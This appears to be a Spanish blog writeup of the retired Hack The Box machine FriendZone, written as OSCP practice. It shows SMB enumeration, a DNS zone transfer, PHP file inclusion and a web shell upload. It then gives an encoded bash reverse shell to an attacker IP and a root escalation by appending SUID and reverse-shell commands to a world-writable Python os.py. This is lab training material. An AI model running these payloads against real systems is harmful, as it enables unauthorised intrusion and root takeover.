---
layout: post
title:  "OSCP Path ~ FriendZone Hack The Box (Necesario VIP)"
description: Writeup de la maquina de HackTheBox llamada FRIENDZONE siguiendo el PATH para el OSCP
tags: HTB, OSCP Path, Transferencia de Zona, Multiples Dominios, CRON, LFI, Maquinas Retiradas, Writeup, Hacking
---

# FriendZone ~ Hack The Box to OSCP

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.123       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=" friendzone.red "/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -48m13s, deviation: 1h43m55s, median: 11m46s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2021-08-05T19:22:45+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-05T16:22:45
|_  start_date: N/A
```
Lanzamos el script `http-enum`
```bash
80/tcp  open  http
| http-enum: 
|   /wordpress/: Blog
|_  /robots.txt: Robots fil
```
Lanzamos la herramienta `whatweb`
```bash
http://10.10.10.123: [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[info@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[Friend Zone Escape software]
```

Procedemos a enumera el servicio `SMB` con la herramienta `smbclient` & `smbmap`
```bash
# smbclient -L 10.10.10.123 -N                                                                                                                                                                            

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
```
# smbmap -H 10.10.10.123                                                                                                                                                                                      1 ⚙
[+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```

Procedemos a intentar conectarnos a la maquina victima por el servicio `SMB` con `smbclient`
```bash
# smbclient //10.10.10.123/general -N                                                                                                                                                                     1 ⨯ 1 ⚙
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 21:10:51 2019
  ..                                  D        0  Wed Jan 23 22:51:02 2019
  creds.txt                           N       57  Wed Oct 10 01:52:42 2018

                9221460 blocks of size 1024. 6460368 blocks available
smb: \> binary
binary: command not found
smb: \> get creds.txt 
getting file \creds.txt of size 57 as creds.txt (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
``` 
Encontramos un archivo `.txt` con credenciales que no sabemos para que sirven.
```bash
# cat creds.txt        
creds for the admin THING:

admin:WORKWORKHhallxxxxxxxx
```

#Ataque de Transferencia de Zona
Cuando tenemos el servicio `53 domain` abierto y un dominio potencial como el que habiamos visto antes `friendzone.red` procedemos con la herramienta `dig`
A nivel de http por el puerto 80 habiamos detectado otro posible potencial dominio `frienzoneportal.red`

Incorporamos estos dos dominios a nuestro archivo `/etc/hosts`

Procedemos a hacer un ataque de transferencia de zona
```bash
# host -l friendzoneportal.red 10.10.10.123                                                                                                                                                                   1 ⚙
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

friendzoneportal.red has IPv6 address ::1
friendzoneportal.red name server localhost.
friendzoneportal.red has address 127.0.0.1
admin.friendzoneportal.red has address 127.0.0.1
files.friendzoneportal.red has address 127.0.0.1
imports.friendzoneportal.red has address 127.0.0.1
vpn.friendzoneportal.red has address 127.0.0.1
```                                                                                                                                                                                 
```bash
# host -l friendzone.red 10.10.10.123                                                                                                                                                                         1 ⚙
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

friendzone.red has IPv6 address ::1
friendzone.red name server localhost.
friendzone.red has address 127.0.0.1
administrator1.friendzone.red has address 127.0.0.1
hr.friendzone.red has address 127.0.0.1
uploads.friendzone.red has address 127.0.0.1
```
Incorporamos todos los dominios nuevos al archivo `/etc/hosts`
```bash
"administrator1.friendzone.red
hr.friendzone.red
uploads.friendzone.red
vpn.friendzoneportal.red
files.friendzoneportal.red
imports.friendzoneportal.red
admin.friendzoneportal.red"
```
Y procedemos a echar un vistazo a nivel de http. y https.
Encontramos una pagina que muestra indicios de LFI.
```
https://administrator1.friendzone.red//dashboard.php?image_id=a.jpg&pagename=timestamp

Final Access timestamp is 1628457816
```
LFI con Wrapper
PHP de BASE 64
```bash
https://administrator1.friendzone.red//dashboard.php?image_id=&pagename=php://filter/convert.base64-encode/resource=dashboard

PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=
```
Decodeamos el archivo en base64
```bash
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>
```
Procedemos a intentar subir un archivo al servicio SMB ya que habiamos averiguado la ruta en la que se almacenaban los archivo era `/etc/`
Para seguidamente desde el LFI que hemos encontrado proceder a ejecutar comandos apuntando a la web-shell que vamos a subir.
```bash
Ponemos un archivo php para causar un webshell al apuntarla desde el LFI  
# smbclient -N //10.10.10.123/Development                                                                                                                                                                    1 ⚙
Try "help" to get a list of possible commands.
smb: \> put shell.php
putting file shell.php as \shell.php (0,1 kb/s) (average 0,1 kb/s)
smb: \> exit
```

Payload pa entrar y ganar acceso como www-data
```bash
https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=/etc/Development/shell&cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%32%34%31%2f%34%34%33%20%30%3e%26%31%27
```
Recibimos la conexion como `www-data` correctamente

# Escalando Privilegios 
Procedemos con el usuario `www-data` a enumerar el sistema. 
Nos movemos a nivel de directorios para la ruta `/var/www/`
Encontramos este archivo de configuracion con las credenciales de el servicio MySQL.

creds en mysql archivo .conf
```bash
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user= friend
db_pass= Agpyu12!0.213$
db_name= FZ
```
Comprobamos si son Validas para SSH
Conseguimos acceso como el usuario `friend`. Procedemos con la enumeracion a nivel de sistema para el usuario `friend`.

encontramos en la ruta /opt/
```bash
friend@FriendZone:/opt$ ls -lR
.:
total 4
drwxr-xr-x 2 root root 4096 Jan 24  2019 server_admin

./server_admin:
total 4
-rwxr--r-- 1 root root 424 Jan 16  2019 reporter.py
```
Procedemos a enumerar con el script `pspy32s`  para localizar si se esta ejecutando alguna tarea CRON
```bash
2021/08/10 15:49:03 CMD: UID=1000 PID=1170   | ./pspy32s 
2021/08/10 15:49:03 CMD: UID=0    PID=115    | 
2021/08/10 15:49:03 CMD: UID=0    PID=1146   | 
2021/08/10 15:49:03 CMD: UID=0    PID=11     | 
2021/08/10 15:49:03 CMD: UID=0    PID=1065   | 
2021/08/10 15:49:03 CMD: UID=0    PID=10     | 
2021/08/10 15:49:03 CMD: UID=0    PID=1      | /sbin/init splash 
2021/08/10 15:50:01 CMD: UID=0    PID=1181   | /usr/bin/python /opt/server_admin/reporter.py 
2021/08/10 15:50:01 CMD: UID=0    PID=1180   | /bin/sh -c /opt/server_admin/reporter.py 
2021/08/10 15:50:01 CMD: UID=0    PID=1179   | /usr/sbin/CRON -f
```
Vemos que es lo que hace el script `reporter.py`
```bash 
friend@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```
Lo unico que vemos relevante es que usa la libreria OS de python, asique vamos a inspeccionar si tenemos permisos en alguna de las librerias
```bash
friend@FriendZone:/usr/lib$ find /usr -name os.py -ls 2>/dev/null
   134708     40 -rw-r--r--   1 root     root        37526 Sep 12  2018 /usr/lib/python3.6/os.py
   282643     28 -rwxrwxrwx   1 root     root        25910 Jan 15  2019 /usr/lib/python2.7/os.py
```
Podemos modificar la libreria de python2.7/os.py al tener permisos de escritura asi cuando la tarea cron ejecute el script 
procedera a ejecutarnos nuestros comandos escritos en el mismo archivo al final.
```bash
friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python2.7/os.py
-rwxrwxrwx 1 root root 26014 Aug 10 16:20 /usr/lib/python2.7/os.py
```
Introducimos estos comandos en la os.py 
```
system("bash -c 'chmod 4755 /bin/bash'")
system("bash -c 'bash -i >& /dev/tcp/10.10.16.241/443 0>&1'")
```
Procedemos a ponernos a la escucha por el puerto 443 con una session de netcat
```
┌──(root💀pro)-[/home/…/HTB/OSCP/FriendZone/nmap]
└─# nc -vlnp 443                                                                                 130 ⨯
listening on [any] 443 ...
connect to [10.10.16.111] from (UNKNOWN) [10.10.10.123] 44500
bash: cannot set terminal process group (1331): Inappropriate ioctl for device
bash: no job control in this shell
root@FriendZone:~# whoami
whoami
root
root@FriendZone:~# cat /root/root.txt
cat /root/root.txt
b0e6c60b82cf96e9855ac1xxxxxxxxxxxx
root@FriendZone:~# 
```

Maquina Rooteada =D !! Seguimos Full Hack
